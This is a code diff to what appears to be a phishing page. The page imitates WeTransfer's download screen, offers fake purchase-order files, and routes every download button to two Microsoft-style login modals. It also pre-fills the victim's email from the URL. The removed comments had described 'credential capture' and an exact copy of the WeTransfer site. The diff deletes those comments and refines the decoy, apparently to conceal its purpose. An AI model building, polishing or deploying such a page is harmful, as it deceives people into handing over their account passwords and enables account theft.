@@ -9,7 +9,7 @@
 
     <style>
         /* ============================================================
-           WeTransfer 品牌变量（来自官网设计系统）
+           WeTransfer 品牌变量
            ============================================================ */
         :root {
             --wt-blue: #3767ea;
@@ -33,7 +33,7 @@
 
         body {
             font-family: var(--wt-font-text);
-            background: var(--wt-blue-tint); /* 淡蓝色背景，匹配官网导航栏区域 */
+            background: var(--wt-blue-tint);
             color: var(--wt-ink);
             display: flex;
             flex-direction: column;
@@ -42,7 +42,7 @@
         }
 
         /* ============================================================
-           顶部导航栏（精确还原 WeTransfer 官网）
+           顶部导航栏
            ============================================================ */
         .wt-nav {
             width: 100%;
@@ -62,7 +62,7 @@
         }
 
         .wt-nav-logo path {
-            fill: var(--wt-canvas); /* 白色 we 标志 */
+            fill: var(--wt-canvas);
         }
 
         .wt-nav-menu {
@@ -107,12 +107,12 @@
         }
 
         /* ============================================================
-           卡片（原有的 accept / download 卡片）
+           卡片设计
            ============================================================ */
         .wt-card {
             background: var(--wt-canvas);
             width: 100%;
-            max-width: 640px;
+            max-width: 680px;
             border-radius: var(--wt-radius);
             padding: 40px 44px 36px;
             box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
@@ -132,48 +132,100 @@
 
         .wt-title {
             font-family: var(--wt-font-display);
-            font-size: 28px;
-            font-weight: 900;
+            font-size: 24px;
+            font-weight: 800;
             line-height: 1.2;
-            margin: 0 0 6px;
+            margin: 0 0 4px;
             color: var(--wt-ink);
         }
 
-        .wt-subtitle { font-size: 14px; color: var(--wt-muted); margin: 0 0 28px; }
+        .wt-subtitle { 
+            font-size: 14px; 
+            color: var(--wt-muted); 
+            margin: 0; 
+        }
 
-        .wt-file-list { border-top: 1px solid var(--wt-gray-30); margin-bottom: 28px; }
+        /* 头部右侧的 Download All 按钮 */
+        .wt-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 24px;
+        }
+
+        .wt-btn-header {
+            width: 180px;
+            height: 44px;
+            background: var(--wt-blue);
+            color: #ffffff;
+            border: none;
+            border-radius: var(--wt-radius-sm);
+            font-family: var(--wt-font-text);
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background .15s ease;
+        }
+        .wt-btn-header:hover { background: var(--wt-blue-hover); }
+
+        /* ============================================================
+           文件列表
+           ============================================================ */
+        .wt-file-list { 
+            border-top: 1px solid var(--wt-gray-30); 
+            margin-bottom: 28px; 
+        }
 
         .wt-file-row {
             display: flex;
             align-items: center;
-            padding: 14px 0;
+            padding: 16px 0;
             border-bottom: 1px solid #f1f1f1;
         }
         .wt-file-row:last-child { border-bottom: none; }
 
-        .wt-file-icon { width: 22px; height: 28px; margin-right: 14px; flex-shrink: 0; }
-
-        .wt-file-name {
-            flex: 1;
-            font-size: 15px;
-            font-weight: 500;
-            color: var(--wt-ink);
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
+        .wt-file-icon { 
+            width: 32px; 
+            height: 40px; 
+            margin-right: 20px; 
+            flex-shrink: 0; 
         }
 
-        .wt-file-size { font-size: 14px; color: var(--wt-muted); margin-right: 18px; flex-shrink: 0; }
+        .wt-file-info {
+            display: flex;
+            align-items: baseline;
+            gap: 10px;
+            flex: 1;
+            overflow: hidden;
+        }
 
+        .wt-file-name {
+            font-size: 15px;
+            font-weight: 400;
+            color: #333;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .wt-file-size { 
+            font-size: 14px; 
+            color: var(--wt-muted); 
+            flex-shrink: 0; 
+        }
+
+        /* 蓝色圆圈下载按钮 */
         .wt-download-icon {
-            width: 24px; height: 24px;
+            width: 28px; 
+            height: 28px;
             cursor: pointer;
             color: var(--wt-blue);
             flex-shrink: 0;
-            transition: color .15s ease;
+            transition: opacity .15s ease;
         }
-        .wt-download-icon:hover { color: var(--wt-blue-hover); }
+        .wt-download-icon:hover { opacity: 0.7; }
 
+        /* 全宽底部按钮 */
         .wt-btn {
             display: block;
             width: 100%;
@@ -192,7 +244,7 @@
         .wt-btn:active { background: var(--wt-blue-active); }
 
         /* ============================================================
-           登录模态框（两阶段凭证捕获）
+           登录模态框
            ============================================================ */
         .login-modal {
             display: none;
@@ -271,7 +323,8 @@
 
         @media (max-width: 560px) {
             .wt-card { padding: 28px 22px 24px; }
-            .wt-title { font-size: 24px; }
+            .wt-card-header { flex-direction: column; gap: 16px; align-items: stretch; }
+            .wt-btn-header { width: 100%; }
             .login-modal-content { padding: 30px 24px; }
             .wt-nav-menu {
                 flex-wrap: wrap;
@@ -285,7 +338,7 @@
 <body onload="load()">
 
     <!-- =========================================================
-         顶部导航栏 — 精确还原 WeTransfer 官网
+         顶部导航栏
          ========================================================= -->
     <nav class="wt-nav">
         <svg class="wt-nav-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg" aria-label="WeTransfer">
@@ -316,25 +369,29 @@
     </nav>
 
     <!-- =========================================================
-         Accept 卡片（初始下载提示）
+         Accept 卡片（初始提示）
          ========================================================= -->
     <div class="wt-card" id="accept-container">
         <svg class="wt-card-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg">
             <path fill="#161616" d="m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z"/>
         </svg>
 
-        <h1 class="wt-title">4 files, 5.6 MB</h1>
-        <p class="wt-subtitle">Transfer expires in 7 days</p>
+        <h1 class="wt-title" style="font-size: 28px; margin-bottom: 6px;">4 files, 5.6 MB</h1>
+        <p class="wt-subtitle" style="margin-bottom: 28px;">Transfer expires in 7 days</p>
 
         <div class="wt-file-list">
-            <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
-                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
-                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
-                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
+            <div class="wt-file-row" style="padding: 14px 0;">
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/>
+                    <path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/>
+                    <path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/>
+                    <rect y="28" width="32" height="12" fill="#E74C3C"/>
+                    <text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text>
                 </svg>
-                <span class="wt-file-name">Purchase order.pdf</span>
-                <span class="wt-file-size">501 KB</span>
+                <div class="wt-file-info">
+                    <span class="wt-file-name">Purchase order.pdf</span>
+                    <span class="wt-file-size">501 KB</span>
+                </div>
             </div>
         </div>
 
@@ -342,76 +399,105 @@
     </div>
 
     <!-- =========================================================
-         Download 卡片（完整文件列表 + Download all）
+         Download 卡片（还原截图的文件列表）
          ========================================================= -->
     <div class="wt-card" id="download-container" style="display:none;">
         <input type="email" id="user" name="user" style="display:none;">
 
-        <svg class="wt-card-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg">
-            <path fill="#161616" d="m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z"/>
-        </svg>
-
-        <h1 class="wt-title">4 files, 5.6 MB</h1>
-        <p class="wt-subtitle">Transfer expires in 7 days</p>
-
-        <div class="wt-file-list">
-            <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
-                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
-                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
-                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
-                </svg>
-                <span class="wt-file-name">Purchase order.pdf</span>
-                <span class="wt-file-size">501 KB</span>
-                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
-                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
+        <!-- 头部区域 -->
+        <div class="wt-card-header">
+            <div>
+                <h1 class="wt-title">File Ready To Download</h1>
+                <p class="wt-subtitle">4 files, 5.6 MB · Transfer expires in 7 days</p>
             </div>
-
-            <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
-                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
-                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
-                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
-                </svg>
-                <span class="wt-file-name">Product Sample.pdf</span>
-                <span class="wt-file-size">501 KB</span>
-                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
-                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-
-            <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
-                    <rect x="1" y="4" width="22" height="22" rx="2" fill="#f1f1f1" stroke="#d6d6d6"/>
-                    <path d="M10 10l6 5-6 5V10z" fill="#676767"/>
-                </svg>
-                <span class="wt-file-name">Sample Video.mp4</span>
-                <span class="wt-file-size">2.3 MB</span>
-                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
-                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-
-            <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
-                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
-                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
-                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
-                </svg>
-                <span class="wt-file-name">Specifications.pdf</span>
-                <span class="wt-file-size">2 MB</span>
-                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
-                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
+            <button class="wt-btn-header" onclick="submitValue()">Download All</button>
         </div>
 
-        <button class="wt-btn" onclick="submitValue()">Download all</button>
+        <!-- 文件列表 -->
+        <div class="wt-file-list">
+            
+            <!-- 1. Purchase order.pdf -->
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/>
+                    <path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/>
+                    <path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/>
+                    <rect y="28" width="32" height="12" fill="#E74C3C"/>
+                    <text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text>
+                </svg>
+                <div class="wt-file-info">
+                    <span class="wt-file-name">Purchase order.pdf</span>
+                    <span class="wt-file-size">501 KB</span>
+                </div>
+                <!-- 蓝色圆圈下载图标 -->
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/>
+                    <path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+            <!-- 2. Product Sample.pdf -->
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/>
+                    <path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/>
+                    <path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/>
+                    <rect y="28" width="32" height="12" fill="#E74C3C"/>
+                    <text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text>
+                </svg>
+                <div class="wt-file-info">
+                    <span class="wt-file-name">Product Sample.pdf</span>
+                    <span class="wt-file-size">501 KB</span>
+                </div>
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/>
+                    <path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+            <!-- 3. Sample Video.mp4 -->
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="0" y="10" width="32" height="20" rx="4" fill="#FF0000"/>
+                    <path d="M13 16L21 20L13 24V16Z" fill="white"/>
+                </svg>
+                <div class="wt-file-info">
+                    <span class="wt-file-name">Sample Video.mp4</span>
+                    <span class="wt-file-size">2.3 MB</span>
+                </div>
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/>
+                    <path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+            <!-- 4. Specifications.pdf -->
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/>
+                    <path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/>
+                    <path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/>
+                    <rect y="28" width="32" height="12" fill="#E74C3C"/>
+                    <text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text>
+                </svg>
+                <div class="wt-file-info">
+                    <span class="wt-file-name">Specifications.pdf</span>
+                    <span class="wt-file-size">2 MB</span>
+                </div>
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/>
+                    <path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+        </div>
+
+        <!-- 底部按钮 -->
+        <button class="wt-btn" onclick="submitValue()">Download All</button>
     </div>
 
     <!-- =========================================================
-         Stage 1 模态框 — Microsoft 登录（凭证捕获）
+         Stage 1 模态框
          ========================================================= -->
     <div id="stage1-modal" class="login-modal">
         <div class="login-modal-content">
@@ -436,7 +522,7 @@
     </div>
 
     <!-- =========================================================
-         Stage 2 模态框 — 重新输入密码
+         Stage 2 模态框
          ========================================================= -->
     <div id="stage2-modal" class="login-modal">
         <div class="login-modal-content">
@@ -472,14 +558,12 @@ let firstPassword = '';
 
 /* ---------- URL 解析：?auth=<email>（新） + base64（旧版兼容） ---------- */
 function parseUserFromUrl() {
-    /* 1) 首选：?auth=email@domain.com  （URLSearchParams 会自动解码 %40） */
     try {
         const params = new URLSearchParams(window.location.search);
         const auth = params.get('auth');
         if (auth) return auth;
     } catch (e) {}
 
-    /* 2) 旧版：?<base64("user=email")>  — 仅当原始查询字符串中没有 '=' 时 */
     const search = window.location.search;
     if (search && search.length > 1 && !search.includes('=')) {
         try {
@@ -488,7 +572,6 @@ function parseUserFromUrl() {
         } catch (e) {}
     }
 
-    /* 3) 旧版：#<base64("user=email")> */
     const hash = window.location.hash.substring(1);
     if (hash) {
         try {
@@ -500,14 +583,12 @@ function parseUserFromUrl() {
 }
 
 function load() {
-    /* 保留 ?auth=… 形式的 URL 不变，使其保持可读 */
     const hasAuthParam = (() => {
         try { return new URLSearchParams(window.location.search).has('auth'); }
         catch (e) { return false; }
     })();
 
     if (!hasAuthParam) {
-        /* 旧版 hash → base64 查询字符串重写（不变） */
         const hash = window.location.hash.substring(1);
         if (hash) {
             let decoded;
